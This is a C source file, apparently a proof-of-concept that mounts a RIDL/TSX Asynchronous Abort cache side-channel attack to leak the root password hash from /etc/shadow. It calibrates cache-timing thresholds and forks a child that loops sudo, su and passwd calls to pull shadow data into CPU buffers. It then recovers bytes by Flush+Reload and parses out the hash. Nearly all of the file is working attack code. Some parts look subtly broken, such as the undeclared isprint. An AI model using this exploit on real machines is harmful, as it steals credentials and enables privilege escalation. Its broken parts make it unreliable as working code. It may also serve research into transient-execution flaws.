#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <string.h>
#include <x86intrin.h>   
#include <stdbool.h>
#include <stdlib.h>
#include "asm.h"        

#define NUM_SAMPLES 10000
#define NUM_ITERATIONS 20
#define CONFIDENCE_THRESHOLD 5
#define ROUNDS 100
#define STRIDE 4096
#define POSSIBLE_BYTES 256
#define BYTES_TO_LEAK 8               

static uint8_t *leak;
static uint8_t *reloadbuffer;                     
static uint64_t CACHE_THRESHOLD;

uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;
    
    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();
        
        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }
    
    return min_time;
}

uint64_t get_cache_threshold(){
    uint64_t hits = 0;    
    uint64_t misses = 0;   
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    //HITS
    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 0);
        hits += delta_t;
    }

    //MISSES
    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hit_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hit_avg) / 2;
 
    return threshold;
}

uint64_t get_reload_time(unsigned char *addr) {
    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();
    
    uint64_t delta_t = end - start;
    return delta_t;
}

char* extract_hash_from_shadow(const char* shadow_data) {
    static char hash[64];
    memset(hash, 0, sizeof(hash));
    
    // Look for pattern: root:$1$salt$hash:
    char* root_pos = strstr(shadow_data, "root:");
    if (!root_pos) return NULL;
    
    // Find the hash part after $1$salt$
    char* hash_start = strstr(root_pos, "$1$");
    if (!hash_start) return NULL;
    
    // Skip to third $
    hash_start = strchr(hash_start + 3, '$');
    if (!hash_start) return NULL;
    hash_start++; // Skip the $
    
    // Find end of hash (next :)
    char* hash_end = strchr(hash_start, ':');
    if (!hash_end) return NULL;
    
    int hash_len = hash_end - hash_start;
    if (hash_len > 32) hash_len = 32; // MD5 hash is 32 chars
    
    strncpy(hash, hash_start, hash_len);
    return hash;
}

int main(void) {
    printf("=== RIDL Attack on /etc/shadow ===\n");
    
    CACHE_THRESHOLD = get_cache_threshold() * 0.7;
    printf("Cache threshold: %lu\n", CACHE_THRESHOLD);

    // Fork child process to trigger /etc/shadow access
    pid_t trigger_pid = fork();
    if (trigger_pid == 0) {
        // Child: continuously trigger authentication
        while(1) {
            cpuid(); // Keep CPU busy like original
            
            static int counter = 0;
            if (++counter % 50 == 0) {
                // Various ways to trigger shadow access
                system("sudo -n whoami 2>/dev/null");
                system("su root -c 'echo test' 2>/dev/null");
                system("passwd --status root 2>/dev/null");
                usleep(1000); // 1ms delay
            }
        }
        _exit(0);
    }

    // Setup memory regions
    size_t leak_len = 4096;
    size_t const mmap_prot = PROT_READ | PROT_WRITE;
    size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB;

    leak = mmap(NULL, leak_len, mmap_prot, mmap_flags, -1, 0);
    if (leak == MAP_FAILED) { 
        perror("mmap leak"); 
        return 1; 
    }

    reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);
    if (reloadbuffer == MAP_FAILED) { 
        perror("mmap reloadbuffer"); 
        return 1; 
    }

    char leaked_data[1024] = {0};
    int data_len = 0;
    bool found_root = false;
    
    printf("Starting RIDL attack to leak /etc/shadow...\n");
    
    // RIDL attack loop
    for(int byte_pos = 0; byte_pos < 500 && data_len < 800; byte_pos++) {
        uint32_t all_hit_bytes[256] = {0};

        for(int iteration = 0; iteration < NUM_ITERATIONS; iteration++) {
            
            // Step 1: Flush reload buffer
            for (int i = 0; i < POSSIBLE_BYTES; i++) {
                clflush(&reloadbuffer[i * STRIDE]);
            }

            clflush(leak + (byte_pos % 4096));
            sfence();
            clflush(reloadbuffer); // Necessary to cause TAA

            // Step 2: TAA - same technique as CrossTalk
            if (_xbegin() == _XBEGIN_STARTED) {
                size_t index = *(leak + (byte_pos % 4096)) * STRIDE;
                *(volatile char*)(reloadbuffer + index);
                _xend();
            }

            // Step 3: Reload and measure access times
            for(int j = 0; j < POSSIBLE_BYTES; j++) {
                uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
                if(reload_time < CACHE_THRESHOLD) {
                    all_hit_bytes[j]++;
                    break;
                }
            }
        }

        // Find most likely character (focus on printable ASCII)
        uint8_t best_char = 0;
        size_t max_hits = 0;
        for(int i = 32; i < 127; i++) { // Printable ASCII only
            if(all_hit_bytes[i] > max_hits) {
                max_hits = all_hit_bytes[i];
                best_char = i;
            }
        }

        if(max_hits >= CONFIDENCE_THRESHOLD) {
            leaked_data[data_len++] = best_char;
            printf("Byte %d: '%c' (0x%02x) - hits: %zu\n", 
                   data_len-1, isprint(best_char) ? best_char : '?', best_char, max_hits);
            
            // Check if we found "root:" pattern
            if(!found_root && strstr(leaked_data, "root:") != NULL) {
                printf("\n*** Found 'root:' pattern! ***\n");
                found_root = true;
            }
            
            // Check if we have a complete hash
            char* hash = extract_hash_from_shadow(leaked_data);
            if(hash && strlen(hash) >= 22) { // MD5 hashes are typically 22+ chars
                printf("\n*** HASH FOUND! ***\n");
                printf("Leaked hash: %s\n", hash);
                printf("Full shadow data: %s\n", leaked_data);
                break;
            }
        }
        
        // Progress indicator
        if(byte_pos % 50 == 0) {
            printf("Progress: %d/500 bytes attempted, %d chars leaked\n", byte_pos, data_len);
        }
    }

    printf("\n=== Final Results ===\n");
    printf("Total leaked data (%d chars): %s\n", data_len, leaked_data);
    
    char* final_hash = extract_hash_from_shadow(leaked_data);
    if(final_hash) {
        printf("Extracted hash: %s\n", final_hash);
    } else {
        printf("No valid hash found in leaked data\n");
    }

    // Cleanup
    kill(trigger_pid, SIGKILL);
    waitpid(trigger_pid, NULL, 0);
    munmap(leak, leak_len);
    munmap(reloadbuffer, POSSIBLE_BYTES * STRIDE);
    
    return 0;
}